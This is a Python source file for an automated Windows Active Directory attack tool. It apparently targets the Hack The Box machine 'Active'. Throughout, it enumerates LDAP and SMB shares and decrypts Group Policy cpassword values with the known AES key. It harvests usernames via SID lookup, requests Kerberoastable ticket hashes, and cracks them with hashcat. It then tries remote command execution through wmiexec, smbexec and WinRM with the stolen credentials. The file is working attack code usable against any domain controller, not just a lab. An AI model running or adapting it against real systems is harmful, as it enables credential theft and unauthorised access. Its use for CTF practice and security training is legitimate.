import time
import coloredlogs, logging
import argparse
from io import BytesIO
from os import path, mkdir, path, remove
import subprocess

from impacket.smbconnection import SMBConnection, SessionError
from tempfile import mkdtemp, mkstemp, gettempdir
from gitleaks_py import gitleaks_command as gl_c, gitleaks_model as gl_m
import requests
from defusedxml import ElementTree
from Crypto.Cipher import AES
import base64

import ldap3
import magic
import zipfile

import re
import traceback
import winrm
from english_words import get_english_words_set

import nltk
nltk.download('wordnet')      

import hashlib

import nmap3

def getmd5(filename):
 return hashlib.md5(open(filename,'rb').read()).hexdigest()

# From https://www.reddit.com/r/learnpython/comments/g1sdkh/comment/fnhdecy/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button
from collections import Counter
from math import log

def shannon(string):
  counts = Counter(string)
  frequencies = ((i / len(string)) for i in counts.values())
  return - sum(f * log(f, 2) for f in frequencies)

lemma = nltk.stem.WordNetLemmatizer()

# https://app.hackthebox.com/machines/Active

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)
coloredlogs.install(level='DEBUG')

parser = argparse.ArgumentParser(prog='WindowsSolver')
parser.add_argument('--ip', help='target IP', required=True)
parser.add_argument('--usernames', help='File with initial list of usernames')
parser.add_argument('--passwords', help='File with initial list of passwords')
parser.add_argument('--credentials', help='File with initial list of credentials, format "username:password"')
parser.add_argument('--credential', help='Initial credential, format "username:password"')

hash_file_name = path.join(gettempdir(), "hash.txt")
if path.exists(hash_file_name):
    remove(hash_file_name)

known_files = set()


_fid, GITLEAKS_DEFAULT_CONFIG_FILE = mkstemp()

with open(GITLEAKS_DEFAULT_CONFIG_FILE, "w") as cfg:
    cfg.write(requests.get(gl_m.GITLEAKS_DEFAULT_CONFIG_FILE).text)

usernames_to_test = ["", "guest"]
usernames = set(usernames_to_test)
passwords = set()

credentials = {}

web2lowerset = get_english_words_set(['web2'], lower=True)

def save_creds(username, password):
    credentials[username] = password
    usernames_to_test.append(username)

ad_infos = {}

def query_ldap_ad(ip):
    server = ldap3.Server(f"ldap://{ip}", get_info=ldap3.ALL)
    connection = ldap3.Connection(server, user="", password="", auto_bind=True)
    info = server.info
    ad_infos['naming_context'] = info.naming_contexts[0]
    ad_infos['domain'] = info.other['ldapServiceName'][0].split(':')[0]

def decrypt(cpass):
    """
        From https://github.com/t0thkr1s/gpp-decrypt/blob/c71c7a6c3c8d251bf1b66050a00b9bb53362d326/gpp-decrypt.py#L21C1-L30C65
    """
    padding = '=' * (4 - len(cpass) % 4)
    epass = cpass + padding
    decoded = base64.b64decode(epass)
    key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8' \
          b'\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
    iv = b'\x00' * 16
    aes = AES.new(key, AES.MODE_CBC, iv)
    return aes.decrypt(decoded).decode(encoding='ascii').strip()

def parse_groups_xml(output):
    tree = ElementTree.fromstring(output)
    user = tree.find('User')
    if user is not None:
        properties = user.find('Properties')
        username = properties.attrib.get('userName')
        cpass = properties.attrib.get('cpassword')
        decrypted_pass = decrypt(cpass).encode().decode("utf-16")
        logger.warning(f"New credentials found : {username}:{decrypted_pass}")
        save_creds(username, decrypted_pass)

def list_files_in_share(connection, share_name, path, depth, tmp_dir):
    for f in connection.listPath(share_name, path + "/*"):
        name = f.get_longname()
        if f.is_directory() and name in ['.', '..']:
             continue

        logger.warning("  "*depth +  "%crw-rw-rw- %10d  %s %s" % ('d' if f.is_directory() > 0 else '-', f.get_filesize(), time.ctime(float(f.get_mtime_epoch())), name))
        if f.is_directory():
            list_files_in_share(connection, share_name, path + "/" + name, depth + 1, tmp_dir)
        else:
            fh = BytesIO()
            connection.getFile(share_name, path + "/" + name, fh.write)
            output = fh.getvalue()
            current_file_name = tmp_dir + "/" + name
            with open(current_file_name, "wb") as f_smb:
                f_smb.write(output)

            try:
                file_magic = magic.from_file(current_file_name)
            except Exception as e:
                traceback.print_exc()
                file_magic = "Unknown"
        
            logger.debug(f"Type of {current_file_name} " + file_magic)

            hash_filename = getmd5(current_file_name)

            if hash_filename in known_files:
                continue

            known_files.add(hash_filename)

            if name == "Groups.xml":
                parse_groups_xml(output)
            elif file_magic.startswith("PDF document"):
                subprocess.run(["pdftotext", current_file_name, current_file_name+".txt"])
                data = open(current_file_name+".txt").read().split()
                words = [x for x in data if lemma.lemmatize(x.lower()) not in web2lowerset and len(x) > 5]
                possible_passwords = sorted([(x,shannon(x.lower())) for x in words], key=lambda t: -t[1])
                
                print("Potential passwords in PDF: ")
                for i, password in enumerate(possible_passwords):
                    print(f" - {i}: {password}")
                
                index = int(input("Index of password to keep? "))
                
                passwords.add(possible_passwords[index][0])

            elif file_magic.startswith("Zip archive data"):
                try:
                    with zipfile.ZipFile(current_file_name, 'r') as zip_ref:
                        zip_ref.extractall(current_file_name + "_extract")
                except:
                    traceback.print_exc()
                    logger.error(f"Unable to unzip {current_file_name}")

def scan_for_secrets(tmp_dir):
    logger.info(f"Scanning {tmp_dir} for secrets")
    logger.info(gl_c.detect(GITLEAKS_DEFAULT_CONFIG_FILE, tmp_dir))


def ldap_find_kerberoasting(ip, domain, username, password):
    escaped_username = username.replace("\\", "/")
    get_user_spns_command = ["GetUserSPNs.py", domain + "/" + escaped_username + ":" + password, "-dc-ip", ip, "-request"]
    if password == "":
        get_user_spns_command.append("-no-pass")
    print(get_user_spns_command)
    result = subprocess.run(get_user_spns_command, capture_output=True, text=True, check=True)
    output = result.stdout
    
    # GetUserSPNs.py -outputfile /tmp/hash.txt
    with open(hash_file_name, "a") as hash_file:
        for line in output.splitlines():
            if line.startswith("$krb5tgs$"):
                logger.info("Kerberoasting on for a new user")
                hash_file.write(line + "\n")

def crack_hashes():
    logger.warning("Hashcat in progress...")
    hashcat_command = ["hashcat", "--runtime", "60", "-a", "0", "-m", "13100", hash_file_name, "/usr/share/wordlists/rockyou.txt", "--quiet"]
    try:
        result = subprocess.run(hashcat_command, check=True, capture_output=True)
    except subprocess.CalledProcessError:
        logger.info("Fail to crack hash")
        return
    output = result.stdout
    logger.info(output)

    for line in output.split(b"\n"):
        if line.startswith(b"$krb5tgs$"):
            components = line.split(b"$")
            username = components[3].decode()
            if username[0] == '*':
                username = username[1:]
            password = b":".join(components[-1].split(b":")[1:])
            logger.warning(f"Found new creds: {username}:{password}")
            save_creds(username, password.decode())

def test_wmiexec(ip, domain, username, password):
    logger.info(f"Testing wmiexec to get access as {username}")
    wmiexec_command = ["impacket-wmiexec", f"{domain}/{username}:{password}@{ip}", 'whoami /all']
    if password == "":
        wmiexec_command.append("-no-pass")
    result = subprocess.run(wmiexec_command, capture_output=True)
    if result.returncode == 0:
        logger.warning(f"Getting access to shell with wmiexec {username}:{password}")
        output = result.stdout
        logger.info(output.decode())

def test_smbexec(ip, domain, username, password):
    logger.info(f"Testing smbexec to get access as {username}")
    smbexec_command = ["impacket-smbexec", f"{domain}/{username}:{password}@{ip}", 'whoami /all']
    result = subprocess.run(smbexec_command, capture_output=True)
    if result.returncode == 0:
        logger.warning(f"Getting access to shell with smbexec {username}:{password}")
        output = result.stdout
        logger.info(output.decode())

def test_winrm(ip, domain, username, password):
    logger.info(f"Testing winrm to get access as {username}")
    try:
        s = winrm.Session(ip, auth=(username, password))
        r = s.run_cmd('whoami', ['/all'])
        logger.info("Successfully connect with WinRM as username")
        logger.info(r)
    except winrm.exceptions.InvalidCredentialsError:
        logger.warning(f"Fail to connect with WinRM as {username}")



def list_shares(ip, user = "", password = ""):
    logger.info(f"Listing shares as {user}")
    
    connection = SMBConnection(remoteName = ip, remoteHost = ip)
    connection.login(user, password)

    tmp_dir = mkdtemp(prefix="ws_")
    try:
        shares = connection.listShares()
    except SessionError as e:
        logger.error(f"Unable to get shares, error: {e}")
        return
    logger.info(f"Number of shares found: {len(shares)}")
    for s in shares:
        share_name = s.fields['shi1_netname'].fields['Data'].fields['Data'].decode("utf-16le")[:-1]
        share_comment = s.fields['shi1_remark'].fields['Data'].fields['Data'].decode("utf-16le")[:-1]
        base_msg = " %r (%r) : " %(share_name, share_comment)
        try:
            connection.connectTree(share_name)
            logger.warning(base_msg + "Readable")
            mkdir(tmp_dir + "/" + share_name)
            list_files_in_share(connection, share_name, '', depth = 0, tmp_dir=tmp_dir + "/" + share_name)
        except SessionError as e:
            logger.info(base_msg + "Not readable")
            logger.debug(e)
        scan_for_secrets(tmp_dir)

def sync_time(ip):
    logger.info("Syncing time with target...")
    sync_command = ["sudo", "rdate", "-vn", ip]
    result = subprocess.run(sync_command, capture_output=True)
    logger.debug(result.stdout.decode())
    if result.returncode != 0:
        logger.error("Fail to sync date with target, it might block communication with KRB service")
        logger.error("Add '<username> ALL=(root) /usr/sbin/rdate -vn *' to /etc/sudoers to allow the script to update it automatically")

def list_users(ip, domain, username, password):
    logger.info(f"Listing RPC users as {username}...")
    regex = r".*: .*\\(.*) \((.*)\)"
    sid_command = ["impacket-lookupsid", f"{domain}/{username}:{password}@{ip}"]
    if password == "":
        sid_command.append("-no-pass")
    result = subprocess.run(sid_command, capture_output=True)
    if result.returncode == 0:
        output = result.stdout.decode()
        matches = re.finditer(regex, output, re.MULTILINE)

        for _matchNum, match in enumerate(matches, start=1):
            username = match.group(1)
            sid_type = match.group(2)
            if sid_type == "SidTypeUser" and  username not in usernames:
                logger.info(f"New username discovered: {username}")
                usernames.add(username)
                usernames_to_test.append(username)
    else:
        print(result)

def scan_ports(ip):
    nmap = nmap3.Nmap()
    results = nmap.scan_top_ports(ip)
    return results[ip]['ports']


if __name__ =="__main__":
    args = parser.parse_args()
    ip = args.ip

    if args.credential is not None and ":" in args.credential:
        username = args.credential.split(":")[0]
        password = ":".join(args.credential.split(":")[1:])
        save_creds(username, password)

    sync_time(ip)

    query_ldap_ad(ip)

    domain = ad_infos['domain']
    logger.warning(f"Domain: {domain}")

    i = 0
    while i < len(usernames_to_test):
        username = usernames_to_test[i]

        passwords_to_test = [""]

        if username in credentials:
            passwords_to_test.append(credentials[username])
        
        passwords_to_test = passwords_to_test + [*passwords]
        for password in passwords_to_test:
            list_users(ip, domain, username, password)

            try:
                list_shares(ip, user=username, password=password)
            except Exception as e:
                logger.info(f"Unable to list SMB with {username}:{password}")
                logger.debug(e)

            ldap_find_kerberoasting(ip, domain, username, password)

            test_wmiexec(ip, domain, username, password)
            test_smbexec(ip, domain, username, password)
            test_winrm(ip, domain, username, password)

        i = i + 1

    crack_hashes()


